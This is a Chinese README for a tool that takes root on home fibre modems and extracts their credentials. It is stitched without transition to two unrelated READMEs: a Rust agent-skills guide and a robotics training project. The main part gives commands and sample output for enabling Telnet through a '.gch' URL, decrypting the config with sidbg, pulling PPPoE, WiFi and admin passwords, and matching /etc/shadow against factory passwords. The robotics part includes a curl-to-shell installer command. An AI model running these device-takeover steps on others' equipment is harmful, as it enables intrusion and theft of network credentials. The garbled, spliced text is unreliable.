光猫（ONT）凭据自查工具箱：**UNG220Z 一键提取**，另含多厂商适配包 `ontkit`
（中兴 / 烽火 / 华为 / 九联），以及固件指纹识别与分家族排障建议。

支持机型与验证状态见 [机型兼容性](#机型兼容性)，其中只有 UNG220Z 经过真机验证。

> ⚠️ 仅用于**你自己的设备**，用于找回自己忘记的管理密码、迁移宽带配置或安全自查。
> 未经授权对他人设备使用属于违法行为，作者不承担任何责任。

## 背景

这类光猫的 Web 管理页基于 `.gch` CGI 框架，登录口令由 TR-069 定期轮换，普通用户拿到的密码往往几天就失效。本工具走 Telnet 通道，直接读取设备配置库，拿到**当下有效**的全部凭据。

## 目录结构

```
ung220z.py          # 主脚本：UNG220Z 一键提权 + 提凭据
ontkit/             # 多厂商适配包
├── cli.py          #   probe / zte / huawei 三个子命令
├── zte_factory.py  #   中兴 webFac 工厂模式（AES-ECB 协议）
├── zte_web.py      #   中兴 .gch 登录、配置解密、凭据提取
├── huawei.py       #   华为 ssmp 登录、开 Telnet（实验性）
└── core.py         #   HTTP 会话 + Telnet 客户端
models/             # 按型号的入口脚本（自动补默认端口）
├── ung853h.py  h3_2.py  g7615.py  hs8145x6.py  b866l1.py
```

## 工作流程

```
用户输入账号密码
   ↓
拼出 http://<ip>/usr=<user>&psw=<pass>&cmd=1&telnet.gch 并打开浏览器（同时脚本直连兜底）
   ↓
Telnet 登录 → root shell
   ↓
sidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml 解密配置
   ↓
提取 Web 账号 / Telnet 口令 / PPPoE / WiFi 密钥 / root 口令
   ↓
打印凭据表 + 落盘日志
```

## 用法

```bash
python3 ung220z.py
```

会依次询问：

```
※ 用户名和密码通常印在光猫【背面贴纸】上（S/N 标签）
  形如「用户名：user   密码：xxxxxxxx」，把光猫翻过来就能看到

① 光猫地址 [192.168.1.1]:
② 用户名 [user]:
③ 密码（输入时不显示）
   密码:
```

也可以全部走命令行：

```bash
python3 ung220z.py -i 192.168.1.1 -u user -p '你的密码'
python3 ung220z.py -i 192.168.1.1 -u user -p '你的密码' --no-browser
```

### 常用参数

| 参数 | 说明 |
|---|---|
| `-i, --ip` | 光猫地址，默认 `192.168.1.1` |
| `-u, --user` | 登录用户名，默认 `user` |
| `-p, --password` | 登录密码，不填则交互输入 |
| `--telnet-user` | Telnet 用户名，默认 `CMCCAdmin` |
| `--telnet-password` | Telnet 口令（部分机型与 Web 口令不同） |
| `--no-browser` | 不调用浏览器，纯 HTTP 请求 |
| `--unlock` | Web 被会话锁占住时重启 httpd 解锁 |
| `--no-release` | 不尝试释放残留 Web 会话 |
| `--telnet-port` | Telnet 端口，默认 23 |
| `--timeout` | 网络超时秒数，默认 8 |

## 输出示例

```
[22:15:00] INFO   会话开始  目标=192.168.1.1  账户=user
[22:15:00] HTTP   已发送给浏览器: http://192.168.1.1/usr=user&psw=***&cmd=1&telnet.gch
[22:15:00] HTTP   telnet.gch → TelnetSet Success!
[22:15:00] PROBE  nc -zv 192.168.1.1 23 → succeeded
[22:15:01] AUTH   Telnet CMCCAdmin / ****** → 登录成功（root）
[22:15:02] SHELL  sidbg 1 DB decry /userconfig/cfg/db_user_cfg.xml → /tmp/debug-decry-cfg
[22:15:03] DATA   DevAuthInfo  CMCCAdmin  / ******  Level=1
[22:15:04] CRACK  MATCH: ******  (/etc/shadow)
```

最后输出凭据汇总表，并写入 `ung220z_<时间戳>.log`。

## 依赖

- Python 3.8+
- 标准库即可，无需 pip 安装
- 设备已开启 Telnet（脚本会自动通过 `telnet.gch` 尝试开启）

## 原理说明

| 环节 | 说明 |
|---|---|
| 开 Telnet | `GET /usr=<user>&psw=<pass>&cmd=1&telnet.gch`，返回 `TelnetSet Success!` 即成功 |
| Web 登录 | 密码前端只做 base64，`Frm_Logintoken` 每次响应递增，必须回填实时值 |
| 配置解密 | `sidbg 1 DB decry` 无口令即可解密，得到明文 XML |
| root 口令 | `/etc/shadow` 中为 SHA-256 crypt，工具会用常见出厂口令比对 |

## 多厂商支持（ontkit）

主脚本只针对九联 `.gch` 体系。遇到其他固件时用 `ontkit`：

```bash
# 先识别固件家族
python3 -m ontkit probe -H 192.168.1.1

# 中兴系（G7615 / UNG853H / 吉比特等）：走 webFac 工厂模式开 Telnet
python3 -m ontkit zte -H 192.168.1.1 -p 8080 --mode factory --enable-telnet

# 华为系（HS8145X6 / B866-L1 等）
python3 -m ontkit huawei -H 192.168.1.1
```

按型号直接跑：

```bash
python3 models/g7615.py    -H 192.168.1.1 --mode factory
python3 models/ung853h.py  -H 192.168.1.1 -u user -P '贴纸密码' --extract
```

各型号的验证状态见 [ontkit/README.md](ontkit/README.md)：webFac 协议按公开实现移植并已自测，
其余型号未经真机验证。

## 排障

### `telnet.gch` 返回 404

说明该固件没有这个接口，**不是九联/吉比特的 `.gch` 体系**，本脚本的开启方式不适用。
脚本会打印设备指纹（`Server` 头 + 页面标题）帮助判断。下一步：

```bash
python3 -m ontkit probe -H 192.168.1.1          # 识别固件家族
python3 -m ontkit zte   -H 192.168.1.1 -p 8080  # 中兴系（webFac 工厂模式）
python3 -m ontkit huawei -H 192.168.1.1         # 华为系（ssmp）
```

### `telnet.gch` 成功但 23 端口未监听

- 设备可能在 Web 后台把 Telnet 服务关闭了，只留了开关接口
- 也可能需要几秒才起监听，等一下重试

### Telnet 能连上但登录被拒

Telnet 与 Web 是**两套账号库**。脚本会依次尝试：

1. 你填的 Web 账号（如 `useradmin`）
2. `CMCCAdmin` + 同一口令
3. `--telnet-password` 指定值
4. Web 侧侦察：`manager_aduser_conf_t.gch&IF_INDEX=0` 读管理员行 → 用其口令登录 → `tele_sec_tserver_t.gch` 取 `TS_UPwd`
5. 出厂默认组合

也可以手动在浏览器（已登录状态）打开：

```
http://<光猫IP>/getpage.gch?pid=1002&nextpage=tele_sec_tserver_t.gch
```

页面源码里 `TS_UName` / `TS_UPwd` 就是 Telnet 账号密码。

### 登录失败次数超限

设备通常 3 次失败进入延时校验，**停止重试**，静默等待 10~30 分钟。

## 修复记录

### v1.2

| 问题 | 修复 |
|---|---|
| 口令含 `%` 时 URL 被当成非法转义，服务器返回 400 | 检测 `% & # ? + 空格`，优先发送百分号编码版（`aDm8H%MdA` → `aDm8H%25MdA`） |
| 缺少烽火（FiberHome）支持 | 新增 `ontkit fiberhome` + `models/hg6042a1.py`，用 MAC 开 Telnet 并读 `show admin_pwd` |

### v1.1（合并社区反馈）

| 问题 | 影响 | 修复 |
|---|---|---|
| `ls` 的 stderr 也落在 pty 上 | 解密失败被判成功，最后打印一张空凭据表 | 改用 `test -s && echo __OK__` 判定 |

content.readme: # Beautiful Rust Three standard [Agent Skills](https://agentskills.io) and a lints config that teach coding agents to write, review, port, and enforce idiomatic Rust: - **`rust-best-practices`** loads whenever an agent writes or changes Rust, and steers it toward idiomatic, robust, maintainable code. - **`rust-review`** reviews existing Rust code, a file, a crate, or a diff, and writes a prioritized report where every finding cites the rule it breaks and shows the fix. - **`rust-port`** ports C, C++, Python, Go, or JavaScript to idiomatic Rust with the same behavior, porting the original tests first so you can prove the two match. - **`lints/`** is a drop-in clippy configuration that enforces the machine-checkable rules in CI. They work with Claude Code, OpenAI Codex, GitHub Copilot, Cursor, Gemini CLI, and any other agent that reads the Agent Skills format. Every code example in the skills compiles on stable Rust, and every lint in the config was checked against current clippy. The guidance is distilled from five sources, with a condensed digest of each bundled in the skill so the agent can consult the original reasoning when it needs to: - [Google Rust Style Guide](https://google.github.io/styleguide/rustguide.html) - [Rust API Guidelines](https://rust-lang.github.io/api-guidelines/) (official rust-lang checklist) - [Effective Rust](https://www.lurklurk.org/effective-rust/) by David Drysdale - [Rust Design Patterns](https://rust-unofficial.github.io/patterns/) (idioms, patterns, anti-patterns) - [Microsoft Pragmatic Rust Guidelines](https://microsoft.github.io/rust-guidelines/) Where the sources disagree, the skill picks a side and says why. ## What it changes Asked for a small semver-parsing library, an agent without the skill produced working code with public fields, no `# Errors` docs, and `unwrap()` in its doc examples. With the skill, the same agent kept the fields private, documented failure modes, and wrote doc examples users can copy safely. Condensed from those two runs: ```rust // Without the skill /// A semantic version. The fields are public for convenience. pub struct Version { pub major: u64, pub minor: u64, pub patch: u64, pub pre: Vec, pub build: Vec, } impl Version { /// Parses a version string. /// /// ``` /// let v = Version::parse("1.2.3").unwrap(); /// ``` pub fn parse(s: &str) -> Result { /* ... */ } } ``` ```rust // With the skill /// A semantic version. Equality, hashing, and ordering ignore build metadata. pub struct Version { major: u64, minor: u64, patch: u64, pre: Vec, build: Vec, } impl Version { /// Parses a version string according to SemVer 2.0.0. /// /// # Errors /// /// Returns [`ParseVersionError`] if the string is empty, a numeric part has a /// leading zero or overflows `u64`, or an identifier contains invalid characters. /// /// ``` /// # use semver_lite::Version; /// # fn main() -> Result<(), semver_lite::ParseVersionError> { /// let v = Version::parse("1.2.3-beta.1")?; /// assert_eq!(v.major(), 1); /// # Ok(()) /// # } /// ``` pub fn parse(s: &str) -> Result { /* ... */ } /// Returns the major version number. pub fn major(&self) -> u64 { self.major } } ``` Across three test tasks (a library, a CLI, and refactoring a messy module), the skill passed 29 of 30 checks against 24 of 30 without it. See [Testing the skills](#testing-the-skills). ## Install Each skill is a folder under `skills/`: `rust-best-practices/`, `rust-review/`, and `rust-port/`. Every option below puts those folders where your agent looks for skills. Install all three; the review and port skills lean on the best-practices skill for style. ### Any agent, one command The [`skills`](https://github.com/vercel-labs/skills) installer supports most agents (Node 22.20 or later): ```bash npx skills add morganlinton/BeautifulRust ``` Add `-g` to install for your user instead of the current project, or `-a ` to pick an agent, such as `-a codex` or `-a cursor`. ### Claude Code Install it as a plugin so updates arrive with one command: ```bash claude plugin install beautiful-rust --marketplace morganlinton/BeautifulRust ``` Inside a session, the same thing is: ``` /plugin marketplace add morganlinton/BeautifulRust /plugin install beautiful-rust@beautiful-rust ``` This installs all three skills. They appear as `/beautiful-rust:rust-best-practices`, `/beautiful-rust:rust-review`, and `/beautiful-rust:rust-port`, though you rarely need to call them, since they trigger on their own. # SuperMimic

[Project page](https://supermimic.github.io) | [Paper](https://arxiv.org/abs/2610.28480)

SuperMimic trains a humanoid whole-body motion tracker with one differentiable world model, built on [mjlab](https://github.com/mujocolab/mjlab).

## Setup

Install [uv](https://docs.astral.sh/uv/):

```bash
curl -LsSf https://astral.sh/uv/install.sh | sh
```

Clone both repos as siblings:

## Usage

Available task IDs:

- `SuperMimic-GenCoord-G1` — generalized coordinates representation
- `SuperMimic-MaxCoord-G1` — maximal coordinates representation

Train a world model and policy:

```bash
CUDA_VISIBLE_DEVICES=<GPU_ID> uv run src/supermimic/scripts/train.py \
  <TASK_ID> --runner.run_name <description>
```

Play back a trained model:

```bash
uv run src/supermimic/scripts/play.py \
  <TASK_ID> --wandb-path <RUN_PATH>
```
